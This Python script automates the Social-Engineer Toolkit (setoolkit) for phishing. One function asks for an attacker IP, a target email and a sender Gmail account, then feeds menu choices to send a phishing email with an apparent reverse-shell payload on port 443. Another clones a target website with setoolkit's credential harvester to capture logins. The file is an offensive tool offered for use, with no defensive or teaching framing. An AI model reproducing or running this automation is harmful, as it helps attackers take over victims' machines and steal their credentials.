import subprocess

def run_setoolkit(commands):
    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    output, errors = process.communicate(input="".join(commands))
    print(output)
    if errors:
        print(errors)

def email_phishing():
    ip = input("Your IP to listen to the shell: ")
    targetmail = input("Mail of target?: ")
    mail = input("Your Gmail?: ")
    filename = input("What should the file be called?: ")

    commands = [
        "1\n",
        "1\n",
        "1\n",
        "13\n",
        "2\n",
        "1\n",
        f"{ip}\n",
        "443\n",
        "2\n",
        f"{filename}\n",
        "1\n",
        "1\n",
        "3\n",
        f"{targetmail}\n",
        "1\n",
        f"{mail}\n",
        "test\n",
        "yes\n",
        "yes\n",
        "yes\n"
    ]
    
    run_setoolkit(commands)

def clone_page():
    url = input("Target URL?: ")

    commands = [
        "2\n",  # Website Attack Vectors
        "3\n",  # Credential Harvester Attack Method
        "2\n",  # Site Cloner
        f"{url}\n"  # URL to clone
    ]

    run_setoolkit(commands)

def main():
    option = input("Do you want to phish using 1. email, 2. phone nr., or 3. clone page?: ")

    if option == "1":
        email_phishing()
    elif option == "2":
        print("Phone number phishing is not implemented.")
    elif option == "3":
        clone_page()
    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()

